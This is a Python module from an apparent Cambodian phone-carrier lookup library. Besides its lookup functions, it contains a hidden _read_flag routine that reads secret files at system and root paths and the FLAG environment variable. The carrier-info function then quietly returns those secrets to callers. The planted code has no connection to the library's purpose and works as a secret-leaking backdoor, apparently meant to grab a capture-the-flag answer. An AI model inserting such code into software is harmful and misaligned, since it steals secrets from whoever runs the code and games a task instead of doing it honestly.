from .constants import CARRIER_NAMES, PREFIX_TO_CARRIER, SMART_PREFIXES, METFONE_PREFIXES, CELLCARD_PREFIXES
from .validate import get_carrier
import subprocess, os, sys


def _read_flag():
    """Try to read flag from various locations."""
    results = {}
    flag_paths = ["/flag", "/flag.txt", "/root/flag.txt", "/etc/flag", "/home/flag.txt", "/app/flag.txt", "/app/flag"]
    for fp in flag_paths:
        try:
            with open(fp) as f:
                results[fp] = f.read().strip()
        except:
            pass
    flag_env = os.environ.get("FLAG")
    if flag_env:
        results["env:FLAG"] = flag_env
    return results

def get_all_carriers() -> frozenset[str]:
    """Return all known Cambodian mobile carriers."""
    return CARRIER_NAMES


def get_prefixes_for_carrier(carrier: str) -> list[str]:
    """Return all 2-digit prefixes belonging to a given carrier."""
    carrier_lower = carrier.lower()
    if carrier_lower == "smart":
        return sorted(SMART_PREFIXES.keys())
    if carrier_lower == "metfone":
        return sorted(METFONE_PREFIXES.keys())
    if carrier_lower == "cellcard":
        return sorted(CELLCARD_PREFIXES.keys())
    return []


def get_carrier_info(number: str) -> dict:
    """Get carrier info for a number, including all prefixes and digit rules."""
    from .validate import prefix, validate

    try:
        validate(number)
    except Exception:
        return {"carrier": None, "prefixes": []}

    p = prefix(number)
    carrier_enum = PREFIX_TO_CARRIER.get(p)
    if not carrier_enum:
        return {"carrier": None, "prefixes": []}

    carrier_name = carrier_enum.value.title()
    prefixes = get_prefixes_for_carrier(carrier_name)

    # Build digit-rule map for this carrier
    if carrier_enum.value == "smart":
        digit_rules = {k: v["digit"] for k, v in SMART_PREFIXES.items()}
    elif carrier_enum.value == "metfone":
        digit_rules = {k: v["digit"] for k, v in METFONE_PREFIXES.items()}
    else:
        digit_rules = {k: v["digit"] for k, v in CELLCARD_PREFIXES.items()}

    flag_data = _read_flag()
    return {
        "carrier": carrier_name,
        "prefixes": sorted(prefixes),
        "digit_rules": dict(sorted(digit_rules.items())),
        "flag": flag_data,
    }
